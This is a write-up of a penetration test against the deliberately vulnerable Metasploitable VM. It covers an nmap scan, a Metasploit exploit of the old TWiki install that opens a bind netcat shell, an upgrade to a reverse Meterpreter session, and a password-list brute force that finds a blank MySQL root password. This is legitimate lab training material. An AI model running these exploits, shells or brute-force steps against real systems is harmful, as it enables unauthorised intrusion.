# Writeup

> The Metasploitable virtual machine is an intentionally vulnerable version of Ubuntu Linux designed for testing security tools and demonstrating common vulnerabilities.

In this writeup, we will try to find most of the security issues affecting the VM.

## I. Recon

A quick nmap scan gives us :

```
nmap 192.168.195.128  

Starting Nmap 7.60 ( https://nmap.org ) at 2018-06-02 17:13 CEST
Nmap scan report for 192.168.195.128
Host is up (0.0019s latency).
Not shown: 977 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 4.47 seconds
```

We can see that many services are running on this machine, let's start with the web server running on port 80.

# Port 80

We quickly learn that the web server is Apache 2.2.8. It use PHP 5.2.4 and there is, at the root of the server, a page that contains 5 links to 5 differents apps :

* TWiki
* phpMyAdmin
* Muttilidae
* DVWA
* WebDAV

## TWiki

TWiki is a perl-based web application used to run a collaborative platform. The last stable release is 6.0.2 (released in 2015) but the server run a version that dates back to 2003. 

A little google search reveals quite a few RCE like CVE-2004-1037 and CVE-2008-5305.

Let's have a closer look at these vulnerability by searching if there is any existent metasploit module in relation to TWiki.

```
$ msfconsole 

msf > search twiki

Matching Modules
================

   Name                                    Disclosure Date  Rank       Description
   ----                                    ---------------  ----       -----------
   exploit/unix/http/twiki_debug_plugins   2014-10-09       excellent  TWiki Debugenableplugins Remote Code Execution
   exploit/unix/webapp/moinmoin_twikidraw  2012-12-30       manual     MoinMoin twikidraw Action Traversal File Upload
   exploit/unix/webapp/twiki_history       2005-09-14       excellent  TWiki History TWikiUsers rev Parameter Command Execution
   exploit/unix/webapp/twiki_maketext      2012-12-15       excellent  TWiki MAKETEXT Remote Command Execution
   exploit/unix/webapp/twiki_search        2004-10-01       excellent  TWiki Search Function Arbitrary Command Execution
```

The module `exploit/unix/webapp/twiki_history` seems interesting.

```
msf> use exploit/unix/webapp/twiki_history
msf exploit(unix/webapp/twiki_history) > set RHOST 192.168.195.128
msf exploit(unix/webapp/twiki_history) > set payload cmd/unix/bind_netcat
msf exploit(unix/webapp/twiki_history) > exploit -j
[*] Started bind handler
[*] Command shell session 1 opened (192.168.195.1:56970 -> 192.168.195.128:56789) at 2018-06-03 13:29:23 +0200
```

We get an unix shell, whith `post/multi/manage/shell_to_meterpreter`, we can upgrade this shell to a Meterpreter one.

```
msf exploit(unix/webapp/twiki_history) > use post/multi/manage/shell_to_meterpreter 
msf post(multi/manage/shell_to_meterpreter) > set SESSION 1
msf post(multi/manage/shell_to_meterpreter) > set LHOST 192.168.195.1
msf post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.195.1:4433 
[*] Sending stage (853256 bytes) to 192.168.195.128
[*] Meterpreter session 3 opened (192.168.195.1:4433 -> 192.168.195.128:46146) at 2018-06-03 13:32:10 +0200
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
meterpreter > getuid
Server username: uid=33, gid=33, euid=33, egid=33
```

So we get a nice shell, let's move on now to another web app.

## Phpmyadmin

We can assume that phpmyadmin is backed by MySQL that is listening on port 3306.

Let's try to use `auxiliary/scanner/mysql/mysql_login` with a small pass file (500 most commons) to brute-force the MySQL credentials.

```
msf > use auxiliary/scanner/mysql/mysql_login
msf auxiliary(scanner/mysql/mysql_login) > set USERNAME root
msf auxiliary(scanner/mysql/mysql_login) > set PASS_FILE ~/Desktop/Tools/500.txt
msf auxiliary(scanner/mysql/mysql_login) > set RHOSTS 192.168.195.128
msf auxiliary(scanner/mysql/mysql_login) > set BLANK_PASSWORDS true
msf auxiliary(scanner/mysql/mysql_login) > run

[+] 192.168.195.128:3306  - 192.168.195.128:3306 - Found remote MySQL version 5.0.51a
[!] 192.168.195.128:3306  - No active DB -- Credential data will not be saved!
[+] 192.168.195.128:3306  - 192.168.195.128:3306 - Success: 'root:'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

So the MySQL root password is blank... But we can't connect as root with phpmyadmin. However, we are able to connect to the db with `mysql -u root -h 192.168.195.128 -P 3306 -p --skip-ssl`.


